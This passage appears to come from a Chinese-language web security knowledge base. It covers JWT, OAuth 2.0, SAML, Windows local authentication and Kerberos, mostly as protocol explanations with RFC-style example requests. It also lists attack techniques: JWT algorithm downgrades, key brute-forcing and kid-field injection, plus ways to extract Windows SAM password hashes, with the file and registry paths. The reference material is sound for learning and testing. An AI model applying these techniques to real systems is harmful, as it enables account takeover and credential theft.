<h4>可能的攻击/漏洞<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="id4">
<h5>信息泄漏<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>若SP和IP之前使用明文传输信息，可能会被窃取。</p>
</div>
<div class="section" id="id5">
<h5>伪造<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>如果在通信过程中没有对关键信息进行签名，容易被伪造。</p>
</div>
</div>
</div>
<span id="document-auth/jwt"></span><div class="section" id="jwt">
<h3>JWT<a class="headerlink" href="#jwt" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
</div>
<div class="section" id="id2">
<h4>构成<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>分为三个部分，分别为header/payload/signature。其中header是声明的类型和加密使用的算法。payload是载荷，最后是加上 <code class="docutils literal notranslate"><span class="pre">HMAC(base64(header)+base64(payload),</span> <span class="pre">secret)</span></code></p>
</div>
<div class="section" id="id3">
<h4>安全问题<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="header">
<h5>Header部分<a class="headerlink" href="#header" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>是否支持修改算法为none/对称加密算法</li>
<li>删除签名</li>
<li>插入错误信息</li>
<li>kid字段是否有SQL注入/命令注入/目录遍历</li>
<li>jwk元素是否可信</li>
<li>是否强制使用白名单上的加密算法</li>
</ul>
</div>
<div class="section" id="payload">
<h5>Payload部分<a class="headerlink" href="#payload" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>其中是否存在敏感信息</li>
<li>检查过期策略，比如 <code class="docutils literal notranslate"><span class="pre">exp</span></code> , <code class="docutils literal notranslate"><span class="pre">iat</span></code></li>
</ul>
</div>
<div class="section" id="signature">
<h5>Signature部分<a class="headerlink" href="#signature" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>检查是否强制检查签名</li>
<li>密钥是否可以爆破</li>
<li>是否可以通过其他方式拿到密钥</li>
</ul>
</div>
<div class="section" id="id4">
<h5>其他<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>重放</li>
<li>通过匹配校验的时间做时间攻击</li>
<li>修改算法RS256为HS256</li>
<li>弱密钥破解</li>
</ul>
</div>
</div>
<div class="section" id="id5">
<h4>参考链接<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://auth0.com/blog/">Critical vulnerabilities in JSON Web Token libraries</a></li>
</ul>
</div>
</div>
<span id="document-auth/oauth"></span><div class="section" id="oauth">
<h3>OAuth<a class="headerlink" href="#oauth" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>OAuth是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是2.0版。</p>
<p>OAuth在客户端与服务端之间，设置了一个授权层（authorization layer）。客户端不能直接登录服务端，只能登录授权层，以此将用户与客户端区分开来。客户端登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。</p>
<p>客户端登录授权层以后，服务端根据令牌的权限范围和有效期，向客户端开放用户储存的资料。</p>
<p>OAuth 2.0定义了四种授权方式：授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）和客户端模式（client credentials）。</p>
</div>
<div class="section" id="id2">
<h4>流程<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>用户打开客户端以后，客户端要求用户给予授权</li>
<li>用户同意给予客户端授权</li>
<li>客户端使用上一步获得的授权，向认证服务器申请令牌</li>
<li>认证服务器对客户端进行认证以后，确认无误，同意发放令牌</li>
<li>客户端使用令牌，向资源服务器申请获取资源</li>
<li>资源服务器确认令牌无误，同意向客户端开放资源</li>
</ul>
</div>
<div class="section" id="id3">
<h4>授权码模式<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与服务端的认证服务器进行互动。</p>
<p>其流程为：</p>
<ul class="simple">
<li>用户访问客户端，后者将前者导向认证服务器</li>
<li>用户选择是否给予客户端授权</li>
<li>假设用户给予授权，认证服务器将用户导向客户端事先指定的&quot;重定向URI&quot;（redirection URI） ，同时附上一个授权码</li>
<li>客户端收到授权码，附上早先的&quot;重定向URI&quot;，向认证服务器申请令牌</li>
<li>认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）</li>
</ul>
<p>A步骤中，客户端申请认证的URI，包含以下参数：</p>
<ul class="simple">
<li>response_type：表示授权类型，必选项，此处的值固定为 <code class="docutils literal notranslate"><span class="pre">code</span></code></li>
<li>client_id：表示客户端的ID，必选项</li>
<li>redirect_uri：表示重定向URI，可选项</li>
<li>scope：表示申请的权限范围，可选项</li>
<li>state：表示客户端的当前状态，需动态指定，防止CSRF</li>
</ul>
<p>例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>GET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1
Host: server.example.com
</pre></div>
</div>
<p>C步骤中，服务器回应客户端的URI，包含以下参数：</p>
<ul class="simple">
<li>code：表示授权码，必选项。该码的有效期应该很短且客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端ID和重定向URI，是一一对应关系。</li>
<li>state：如果客户端的请求中包含这个参数，认证服务器回应与请求时相同的参数</li>
</ul>
<p>例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>HTTP/1.1 302 Found
Location: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA&amp;state=xyz
</pre></div>
</div>
<p>D步骤中，客户端向认证服务器申请令牌的HTTP请求，包含以下参数：</p>
<ul class="simple">
<li>grant_type：表示使用的授权模式，必选项，此处的值固定为 <code class="docutils literal notranslate"><span class="pre">authorization_code</span></code></li>
<li>code：表示上一步获得的授权码，必选项</li>
<li>redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致</li>
<li>client_id：表示客户端ID，必选项</li>
</ul>
<p>例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">token</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">server</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="n">Authorization</span><span class="p">:</span> <span class="n">Basic</span> <span class="n">czZCaGRSa3F0MzpnWDFmQmF0M2JW</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>

<span class="n">grant_type</span><span class="o">=</span><span class="n">authorization_code</span><span class="o">&amp;</span><span class="n">code</span><span class="o">=</span><span class="n">SplxlOBeZQQYbYS6WxSbIA</span><span class="o">&amp;</span><span class="n">redirect_uri</span><span class="o">=</span><span class="n">https</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">F</span><span class="o">%</span><span class="mi">2</span><span class="n">Fclient</span><span class="o">%</span><span class="mi">2</span><span class="n">Eexample</span><span class="o">%</span><span class="mi">2</span><span class="n">Ecom</span><span class="o">%</span><span class="mi">2</span><span class="n">Fcb</span>
</pre></div>
</div>
<p>E步骤中，认证服务器发送的HTTP回复，包含以下参数：</p>
<ul class="simple">
<li>access_token：表示访问令牌，必选项</li>
<li>token_type：表示令牌类型，该值大小写不敏感，必选项，可以是 <code class="docutils literal notranslate"><span class="pre">bearer</span></code> 类型或 <code class="docutils literal notranslate"><span class="pre">mac</span></code> 类型</li>
<li>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间</li>
<li>refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项</li>
<li>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略</li>
</ul>
<p>例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">store</span>
<span class="n">Pragma</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>

<span class="p">{</span>
  <span class="s2">&quot;access_token&quot;</span><span class="p">:</span><span class="s2">&quot;2YotnFZFEjr1zCsicMWpAA&quot;</span><span class="p">,</span>
  <span class="s2">&quot;token_type&quot;</span><span class="p">:</span><span class="s2">&quot;example&quot;</span><span class="p">,</span>
  <span class="s2">&quot;expires_in&quot;</span><span class="p">:</span><span class="mi">3600</span><span class="p">,</span>
  <span class="s2">&quot;refresh_token&quot;</span><span class="p">:</span><span class="s2">&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;</span><span class="p">,</span>
  <span class="s2">&quot;example_parameter&quot;</span><span class="p">:</span><span class="s2">&quot;example_value&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id4">
<h4>简化模式<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了授权码这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。</p>
<p>其步骤为：</p>
<ul class="simple">
<li>客户端将用户导向认证服务器</li>
<li>用户决定是否给于客户端授权</li>
<li>假设用户给予授权，认证服务器将用户导向客户端指定的重定向URI，并在URI的Hash部分包含了访问令牌</li>
<li>浏览器向资源服务器发出请求，其中不包括上一步收到的Hash值</li>
<li>资源服务器返回一个网页，其中包含的代码可以获取Hash值中的令牌</li>
<li>浏览器执行上一步获得的脚本，提取出令牌</li>
<li>浏览器将令牌发给客户端</li>
</ul>
<p>A步骤中，客户端发出的HTTP请求，包含以下参数：</p>
<ul class="simple">
<li>response_type：表示授权类型，此处的值固定为 <code class="docutils literal notranslate"><span class="pre">token</span></code> ，必选项</li>
<li>client_id：表示客户端的ID，必选项</li>
<li>redirect_uri：表示重定向的URI，可选项</li>
<li>scope：表示权限范围，可选项</li>
<li>state：表示客户端的当前状态，需动态指定，防止CSRF</li>
</ul>
<p>例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>GET /authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1
Host: server.example.com
</pre></div>
</div>
<p>C步骤中，认证服务器回应客户端的URI，包含以下参数：</p>
<ul class="simple">
<li>access_token：表示访问令牌，必选项</li>
<li>token_type：表示令牌类型，该值大小写不敏感，必选项</li>
<li>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间</li>
<li>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略</li>
<li>state：如果客户端的请求中包含这个参数，认证服务器回应与请求时相同的参数</li>
</ul>
<p>例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">302</span> <span class="n">Found</span>
<span class="n">Location</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">cb</span><span class="c1">#access_token=2YotnFZFEjr1zCsicMWpAA&amp;state=xyz&amp;token_type=example&amp;expires_in=3600</span>
</pre></div>
</div>
<p>在上面的例子中，认证服务器用HTTP头信息的Location栏，指定浏览器重定向的网址。注意，在这个网址的Hash部分包含了令牌。</p>
<p>根据上面的D步骤，下一步浏览器会访问Location指定的网址，但是Hash部分不会发送。接下来的E步骤，服务提供商的资源服务器发送过来的代码，会提取出Hash中的令牌。</p>
</div>
<div class="section" id="id5">
<h4>密码模式<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向&quot;服务商提供商&quot;索要授权。</p>
<p>在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。</p>
<p>其步骤如下：</p>
<ul class="simple">
<li>用户向客户端提供用户名和密码</li>
<li>客户端将用户名和密码发给认证服务器，向后者请求令牌</li>
<li>认证服务器确认无误后，向客户端提供访问令牌</li>
</ul>
<p>B步骤中，客户端发出的HTTP请求，包含以下参数：</p>
<ul class="simple">
<li>grant_type：表示授权类型，此处的值固定为 <code class="docutils literal notranslate"><span class="pre">password</span></code> ，必选项</li>
<li>username：表示用户名，必选项</li>
<li>password：表示用户的密码，必选项</li>
<li>scope：表示权限范围，可选项</li>
</ul>
<p>例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">token</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">server</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="n">Authorization</span><span class="p">:</span> <span class="n">Basic</span> <span class="n">czZCaGRSa3F0MzpnWDFmQmF0M2JW</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>

<span class="n">grant_type</span><span class="o">=</span><span class="n">password</span><span class="o">&amp;</span><span class="n">username</span><span class="o">=</span><span class="n">johndoe</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="n">A3ddj3w</span>
</pre></div>
</div>
<p>C步骤中，认证服务器向客户端发送访问令牌，例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">store</span>
<span class="n">Pragma</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>

<span class="p">{</span>
    <span class="s2">&quot;access_token&quot;</span><span class="p">:</span> <span class="s2">&quot;2YotnFZFEjr1zCsicMWpAA&quot;</span><span class="p">,</span>
    <span class="s2">&quot;token_type&quot;</span><span class="p">:</span> <span class="s2">&quot;example&quot;</span><span class="p">,</span>
    <span class="s2">&quot;expires_in&quot;</span><span class="p">:</span> <span class="mi">3600</span><span class="p">,</span>
    <span class="s2">&quot;refresh_token&quot;</span><span class="p">:</span> <span class="s2">&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;</span><span class="p">,</span>
    <span class="s2">&quot;example_parameter&quot;</span><span class="p">:</span> <span class="s2">&quot;example_value&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id6">
<h4>客户端模式<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<p>客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向服务端进行认证。</p>
<p>其步骤如下：</p>
<ul class="simple">
<li>客户端向认证服务器进行身份认证，并要求一个访问令牌</li>
<li>认证服务器确认无误后，向客户端提供访问令牌</li>
</ul>
<p>A步骤中，客户端发出的HTTP请求，包含以下参数：</p>
<ul class="simple">
<li>granttype：表示授权类型，此处的值固定为 <code class="docutils literal notranslate"><span class="pre">clientcredentials</span></code> ，必选项</li>
<li>scope：表示权限范围，可选项</li>
</ul>
<p>例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">token</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">server</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="n">Authorization</span><span class="p">:</span> <span class="n">Basic</span> <span class="n">czZCaGRSa3F0MzpnWDFmQmF0M2JW</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>

<span class="n">grant_type</span><span class="o">=</span><span class="n">client_credentials</span>
</pre></div>
</div>
<p>B步骤中，认证服务器向客户端发送访问令牌，例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">store</span>
<span class="n">Pragma</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>

<span class="p">{</span>
    <span class="s2">&quot;access_token&quot;</span><span class="p">:</span> <span class="s2">&quot;2YotnFZFEjr1zCsicMWpAA&quot;</span><span class="p">,</span>
    <span class="s2">&quot;token_type&quot;</span><span class="p">:</span> <span class="s2">&quot;example&quot;</span><span class="p">,</span>
    <span class="s2">&quot;expires_in&quot;</span><span class="p">:</span> <span class="mi">3600</span><span class="p">,</span>
    <span class="s2">&quot;example_parameter&quot;</span><span class="p">:</span> <span class="s2">&quot;example_value&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id7">
<h4>参考链接<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://www.rfcreader.com/#rfc6749">rfc6749</a></li>
<li><a class="reference external" href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html">理解OAuth</a></li>
<li><a class="reference external" href="https://ldapwiki.com/wiki/OAuth%202.0%20Vulnerabilities">OAuth 2.0 Vulnerabilities</a></li>
<li><a class="reference external" href="https://oauth.net/">OAuth Community Site</a></li>
</ul>
</div>
</div>
<span id="document-auth/saml"></span><div class="section" id="saml">
<h3>SAML<a class="headerlink" href="#saml" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>SAML (Security Assertion Markup Language) 译为安全断言标记语言，是一种xXML格式的语言，使用XML格式交互，来完成SSO的功能。</p>
<p>SAML存在1.1和2.0两个版本，这两个版本不兼容，不过在逻辑概念或者对象结构上大致相当，只是在一些细节上有所差异。</p>
</div>
<div class="section" id="id2">
<h4>认证过程<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>SAML的认证涉及到三个角色，分别为服务提供者(SP)、认证服务(IDP)、用户(Client)。一个比较典型认证过程如下：</p>
<ol class="arabic simple">
<li>Client访问受保护的资源</li>
<li>SP生成认证请求SAML返回给Client</li>
<li>Client提交请求到IDP</li>
<li>IDP返回认证请求</li>
<li>Client登陆IDP</li>
<li>认证成功后，IDP生成私钥签名标识了权限的SAML，返回给Client</li>
<li>Client提交SAML给SP</li>
<li>SP读取SAML，确定请求合法，返回资源</li>
</ol>
</div>
<div class="section" id="id3">
<h4>安全问题<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>源于ssl模式下的认证可选性，可以删除签名方式标签绕过认证</li>
<li>如果SAML中缺少了expiration，并且断言ID不是唯一的，那么就可能被重放攻击影响</li>
</ul>
</div>
<div class="section" id="id4">
<h4>参考链接<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://en.wikipedia.org/wiki/SAML_2.0">SAML Wiki</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc7522">RFC7522</a></li>
<li><a class="reference external" href="https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace.pdf">SSO Wars The Token Menace</a></li>
</ul>
</div>
</div>
<span id="document-auth/windows"></span><div class="section" id="windows">
<h3>Windows<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>本地用户认证<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>Windows 在进行本地登录认证时操作系统会使用用户输入的密码作为凭证去与系统中的密码进行对比验证。通过 <code class="docutils literal notranslate"><span class="pre">winlogon.exe</span></code> 接收用户输入传递至 <code class="docutils literal notranslate"><span class="pre">lsass.exe</span></code> 进行认证。</p>
<p><code class="docutils literal notranslate"><span class="pre">winlogon.exe</span></code> 用于在用户注销、重启、锁屏后显示登录界面。 <code class="docutils literal notranslate"><span class="pre">lsass.exe</span></code> 用于将明文密码变成NTLM Hash的形式与SAM数据库比较认证。</p>
</div>
<div class="section" id="sam">
<h4>SAM<a class="headerlink" href="#sam" title="永久链接至标题">¶</a></h4>
<p>安全帐户管理器(Security Accounts Manager，SAM) 是Windows操作系统管理用户帐户的安全所使用的一种机制。用来存储Windows操作系统密码的数据库文件为了避免明文密码泄漏SAM文件中保存的是明文密码在经过一系列算法处理过的 Hash值被保存的Hash分为LM Hash、NTLM Hash。当用户进行身份认证时会将输入的Hash值与SAM文件中保存的Hash值进行对比。</p>
<p>SAM文件保存于 <code class="docutils literal notranslate"><span class="pre">%SystemRoot%\system32\config\sam</span></code> 中，在注册表中保存在 <code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\SAM\SAM</span></code> ， <code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\SECURITY\SAM</span></code> 。 在正常情况下 SAM 文件处于锁定状态不可直接访问、复制、移动仅有 system 用户权限才可以读写该文件。</p>
</div>
<div class="section" id="id2">
<h4>密码破解<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>通过物理接触主机、启动其他操作系统来获取 Windows 分区上的 <code class="docutils literal notranslate"><span class="pre">%SystemRoot%\system32\config\sam</span></code> 文件</li>
<li>获取 <code class="docutils literal notranslate"><span class="pre">%SystemRoot%\repair\sam._</span></code> 文件。</li>
<li>使用工具从注册表中导出SAM散列值</li>
<li>从网络中嗅探分析SMB报文，从中获取密码散列</li>
</ul>
</div>
</div>
<span id="document-auth/kerberos"></span><div class="section" id="kerberos">
<h3>Kerberos<a class="headerlink" href="#kerberos" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>Kerberos协议起源于美国麻省理工学院Athena项目，基于公私钥加密体制，为分布式环境提供双向验证，在RFC 1510中被采纳，Kerberos是Windows域环境中的默认身份验证协议。</p>
<p>简单地说，Kerberos提供了一种单点登录(SSO)的方法。考虑这样一个场景，在一个网络中有不同的服务器，比如，打印服务器、邮件服务器和文件服务器。这些服务器都有认证的需求。很自然的，不可能让每个服务器自己实现一套认证系统，而是提供一个中心认证服务器（AS-Authentication Server）供这些服务器使用。这样任何客户端就只需维护一个密码就能登录所有服务器。</p>
<p>Kerberos协议是一个基于票据（Ticket）的系统，在Kerberos系统中至少有三个角色：认证服务器（AS），客户端（Client）和普通服务器（Server）。认证服务器对用户进行验证，并发行供用户用来 请求会话票据的TGT（票据授予票据）。票据授予服务（TGS）：在发行给客户的TGT的基础上，为网络服务发行ST（会话票据）。在Kerberos系统中，客户端和服务器都有一个唯一的名字，叫做Principal。同时，客户端和服务器都有自己的密码，并且它们的密码只有自己和认证服务器AS知道。</p>
</div>
<div class="section" id="id2">
<h4>简化的认证过程<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ol class="arabic simple">
<li>客户端向服务器发起请求，请求内容是：客户端的principal，服务器的principal</li>
<li><dl class="first docutils">
<dt>AS收到请求之后，随机生成一个密码Kc, s(session key), 并生成以下两个票据返回给客户端</dt>
<dd><ol class="first last arabic">
<li>给客户端的票据，用客户端的密码加密，内容为随机密码，session，server_principal</li>
<li>给服务器端的票据，用服务器的密码加密，内容为随机密码，session，client_principal</li>
</ol>
</dd>
</dl>
</li>
<li>客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到Kc、s，然后生成一个Authenticator，其中主要包括当前时间和Ts,c的校验码，并且用SessionKey Kc,s加密。之后客户端将Authenticator和给server的票据同时发给服务器</li>
<li><dl class="first docutils">
<dt>服务器首先用自己的密码解开票据，拿到SessionKey Kc,s，然后用Kc,s解开Authenticator，并做如下检查</dt>
<dd><ol class="first last arabic">
<li>检查Authenticator中的时间戳是不是在当前时间上下5分钟以内，并且检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行Replay攻击。</li>
<li>检查checksum是否正确</li>
<li>如果都正确，客户端就通过了认证</li>
</ol>
</dd>
</dl>
</li>
<li>服务器段可选择性地给客户端回复一条消息来完成双向认证，内容为用session key加密的时间戳</li>
<li>客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器</li>
</ol>
</div>
<div class="section" id="id3">
<h4>完整的认证过程<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>上方介绍的流程已经能够完成客户端和服务器的相互认证。但是，比较不方便的是每次认证都需要客户端输入自己的密码。</p>
<p>因此在Kerberos系统中，引入了一个新的角色叫做：票据授权服务(TGS - Ticket Granting Service)，它的地位类似于一个普通的服务器，只是它提供的服务是为客户端发放用于和其他服务器认证的票据。</p>
<p>这样，Kerberos系统中就有四个角色：认证服务器（AS），客户端（Client），普通服务器（Server）和票据授权服务（TGS）。这样客户端初次和服务器通信的认证流程分成了以下6个步骤：</p>
<ol class="arabic simple">
<li>客户端向AS发起请求，请求内容是：客户端的principal，票据授权服务器的rincipal</li>
<li><dl class="first docutils">
<dt>AS收到请求之后，随机生成一个密码Kc, s(session key), 并生成以下两个票据返回给客户端：</dt>
<dd><ol class="first last arabic">
<li>给客户端的票据，用客户端的密码加密，内容为随机密码，session，tgs_principal</li>
<li>给tgs的票据，用tgs的密码加密，内容为随机密码，session，client_principal</li>
</ol>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到Kc、s，然后生成一个Authenticator，其中主要包括当前时间和Ts,c的校验码，并且用SessionKey Kc,s加密。之后客户端向tgs发起请求，内容包括:</dt>
<dd><ol class="first last arabic">
<li>Authenticator</li>
<li>给tgs的票据同时发给服务器</li>
<li>server_principal</li>
</ol>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>TGS首先用自己的密码解开票据，拿到SessionKey Kc,s，然后用Kc,s解开Authenticator，并做如下检查</dt>
<dd><ol class="first last arabic">
<li>检查Authenticator中的时间戳是不是在当前时间上下5分钟以内，并且检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行Replay攻击。</li>
<li>检查checksum是否正确</li>
<li>如果都正确，客户端就通过了认证</li>
</ol>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>tgs生成一个session key组装两个票据给客户端</dt>
<dd><ol class="first last arabic">
<li>用客户端和tgs的session key加密的票据，包含新生成的session key和server_principal</li>
<li>用服务器的密码加密的票据，包括新生成的session key和client principal</li>
</ol>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>客户端收到两个票据后，解开自己的，然后生成一个Authenticator，发请求给服务器，内容包括</dt>
<dd><ol class="first last arabic">
<li>Authenticator</li>
<li>给服务器的票据</li>
</ol>
</dd>
</dl>
</li>
<li>服务器收到请求后，用自己的密码解开票据，得到session key，然后用session key解开authenticator对可无端进行验证</li>
<li>服务器可以选择返回一个用session key加密的之前的是时间戳来完成双向验证</li>
<li>客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器</li>
</ol>
</div>
<div class="section" id="id4">
<h4>参考链接<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://tools.ietf.org/html/rfc1510">RFC 1510 The Kerberos Network Authentication Service</a></li>
<li><a class="reference external" href="https://blog.csdn.net/jewes/article/details/20792021">Kerberos认证流程详解</a></li>
